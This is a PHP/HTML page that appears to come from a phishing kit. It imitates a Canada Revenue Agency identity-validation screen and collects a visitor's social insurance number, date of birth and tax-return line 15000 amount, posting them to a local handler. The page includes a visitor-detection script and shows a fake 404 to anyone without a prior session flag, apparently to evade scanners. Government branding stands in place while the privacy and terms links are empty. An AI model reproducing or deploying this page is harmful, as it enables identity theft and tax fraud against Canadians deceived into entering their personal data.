<?php
session_start();
ob_start();
require_once('../config.php');
include_once('../includes/php/detect.php');

if(!isset($_SESSION['fallow'])) {
   header('HTTP/1.1 404 Not Found');
   exit();
}
?>
<!DOCTYPE html>
<html>
   <head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1" />
      <link rel="stylesheet" href="./reg.css">
   </head>
   <body>
</header>
<?php include ("files/head.php"); ?>

<main property="mainContentOfPage" class="container">
    <div class="left">
    </div>
    <div class="center">
        <div id="content">
            <h1 id="wb-cont"> Validate your identity </h1>
            <p> Want to enter your CRA security code instead? <a href="login.php">Sign in</a>. </p>
            <form action="php/reg.php" method="post" name="reg">
                <div class="inputContainer">
                    <div class="form-group ">
                        <div>
                            <label for="sin" class="required"> Social insurance number <strong class="required"><i>(required)</i></strong>
                                <a href="#sinHelp" class="wb-lbx wb-init wb-lbx-inited" role="button" aria-controls="centred-popup" id="wb-auto-3"><span class="glyphicon glyphicon-question-sign">
                                    </span></a>
                            </label>
                        </div>
                        <input type="text" name="sin" size="11" maxlength="11" value="" id="sin" class="form-control" autocomplete="off" required>
                    </div>
                </div>
                <div class="inputContainer">
                    <fieldset>
                        <legend class="mrgn-bttm-sm required"> Date of birth <strong class="required"><i>(required)</i></strong>
                        </legend>
                        <div class="form-group ">
                            <label for="birthday" class="wb-inv"> Date of birth Day </label>
                            <select id="birthday" name="birthDay" value="" title="Date of birth Day" class="form-control inline-element" required>
                                <option value="01"> 01 </option>
                                <option value="02"> 02 </option>
                                <option value="03"> 03 </option>
                                <option value="04"> 04 </option>
                                <option value="05"> 05 </option>
                                <option value="06"> 06 </option>
                                <option value="07"> 07 </option>
                                <option value="08"> 08 </option>
                                <option value="09"> 09 </option>
                                <option value="10"> 10 </option>
                                <option value="11"> 11 </option>
                                <option value="12"> 12 </option>
                                <option value="13"> 13 </option>
                                <option value="14"> 14 </option>
                                <option value="15"> 15 </option>
                                <option value="16"> 16 </option>
                                <option value="17"> 17 </option>
                                <option value="18"> 18 </option>
                                <option value="19"> 19 </option>
                                <option value="20"> 20 </option>
                                <option value="21"> 21 </option>
                                <option value="22"> 22 </option>
                                <option value="23"> 23 </option>
                                <option value="24"> 24 </option>
                                <option value="25"> 25 </option>
                                <option value="26"> 26 </option>
                                <option value="27"> 27 </option>
                                <option value="28"> 28 </option>
                                <option value="29"> 29 </option>
                                <option value="30"> 30 </option>
                                <option value="31"> 31 </option>
                            </select>
                            <label for="birthMonth" class="wb-inv"> Date of birth Month </label>
                            <select id="birthMonth" name="birthMonth" value="" title="Date of birth Month" class="form-control inline-element" required>
                                <option value="1"> January </option>
                                <option value="2"> February </option>
                                <option value="3"> March </option>
                                <option value="4"> April </option>
                                <option value="5"> May </option>
                                <option value="6"> June </option>
                                <option value="7"> July </option>
                                <option value="8"> August </option>
                                <option value="9"> September </option>
                                <option value="10"> October </option>
                                <option value="11"> November </option>
                                <option value="12"> December </option>
                            </select>
                            <label for="birthYear" class="wb-inv"> Date of birth Year </label>
                            <input type="text" id="birthYear" name="birthYear" class="form-control inline-element" title="Date of birth Year" value="" size="4" maxlength="4" autocomplete="off" required>
                        </div>
                    </fieldset>
                </div>
                <div class="inputContainer">
                    <div class="form-group ">
                        <div>
                            <label for="tax-line-amount" class="required"> Tax information - Enter line 15000 from your 2023 income tax and benefit return. If your 2023 return has not been filed and assessed, enter line 15000 from your 2022 return - enter dollars only <strong class="required"><i>(required)</i></strong>
                                <a href="#dtfHelp" class="wb-lbx wb-init wb-lbx-inited" role="button" aria-controls="centred-popup" id="wb-auto-4"><span class="glyphicon glyphicon-question-sign">
                                        <span class="wb-inv">Help with—Tax information</span>
                                    </span></a>
                            </label>
                        </div>
                        <div class="input-group col-sm-3">
                            <span class="input-group-addon">$ </span>
                            <input type="text" name="dtfAmount" size="10" maxlength="10" value="" id="tax-line-amount" class="form-control text-right" autocomplete="off" required>
                            <span class="input-group-addon"> .00</span>
                            
                        </div>
                    </div>
                </div>
                <p>For more information on how your privacy is protected, refer to our <a href="" target="_blank" rel="noopener noreferrer"> Personal Information Collection Statement<span class="wb-inv">opens in a separate window</span></a>. </p>
                <div class="formButtons">
                    <div class="h-captcha style-J9M5S" data-sitekey="a06f75d0-edbc-4562-9aef-7e2bb54bbbb2" data-callback="onSubmit" data-hcaptcha-source-id="input[data-hcaptcha-widget-id='0962px0yu02b']" id="style-J9M5S">
                        </div>
                    <input type="submit" name="submitButton" class="btn btn-primary h-captcha" data-sitekey="a06f75d0-edbc-4562-9aef-7e2bb54bbbb2" data-callback="onSubmit" value="Next" id="submitButton" data-hcaptcha-widget-id="0962px0yu02b">
                    <input type="button" name="exit" class="btn btn-default" value="Exit" id="exitButton">
                </div>
            </form>
            <div id="pageLabel"> Screen ID: AMS.a01 </div>
        </div>
        
        
        
        
    </div>
    <div class="hidden-print">
        <dl id="wb-dtmd" property="dateModified">
            <dt>Date modified: </dt>
            <dd><time>2024-02-05</time></dd>
        </dl>
    </div>
</main>
<footer id="wb-info" class=" wb-navcurr-inited">
    <div class="brand" style="border-top:4px solid #335175">
        <div class="container">
            <div class="row ">
                <nav class="col-md-10 ftr-urlt-lnk">
                    <h2 class="wb-inv">About this site</h2>
                    <ul>
                        <li><a href="" rel="noopener noreferrer" target="_blank">Terms and conditions</a></li>
                        <li><a href="" rel="noopener noreferrer" target="_blank">Privacy</a></li>
                    </ul>
                </nav>
                <div class="col-xs-6 visible-sm visible-xs tofpg">
                    <a href="#wb-cont">Top of Page <span class="glyphicon glyphicon-chevron-up"></span></a>
                </div>
                <div class="col-xs-6 col-md-3 col-lg-2 text-right">
                    <img src="./images/wmms-blk.svg" alt="Symbol of the Government of Canada">
                </div>
            </div>
        </div>
    </div>
</footer>
<!--[if gte IE 9 | !IE ]><!-->
<span id="wb-rsz" class="wb-init">&nbsp;</span>
<!--<![endif]-->
<!--[if lt IE 9]>
<script src="/ebci/wet/v5.0.1/wet-boew/js/ie8-wet-boew2.min.js"></script>

<![endif]-->

<a class="wb-lbx lbx-modal mfp-hide wb-init wb-lbx-inited" href="#wb-sessto-modal" id="wb-auto-5"></a>
<section id="wb-sessto-modal" style="visibility:hidden" class="mfp-hide modal-dialog modal-content overlay-def">
    <header class="modal-header">
        <h2 class="modal-title">Session timeout warning</h2>
    </header>
    <div class="modal-body" id="modal-body">
        <p>Your session will expire automatically in <span id="timeout-min">3</span> min <span id="timeout-sec">0</span> sec.<br>Select "Continue session" to extend your session.</p>
    </div>
    <div class="modal-footer" id="modal-footer"><button type="button" class="btn btn-primary popup-modal-dismiss" onclick="awsc.warningTimer.extendSession()">Continue session</button> <button type="button" class="btn btn-default" onclick="awsc.warningTimer.logout()">End session now</button> </div>
</section>

   </body>
</html>
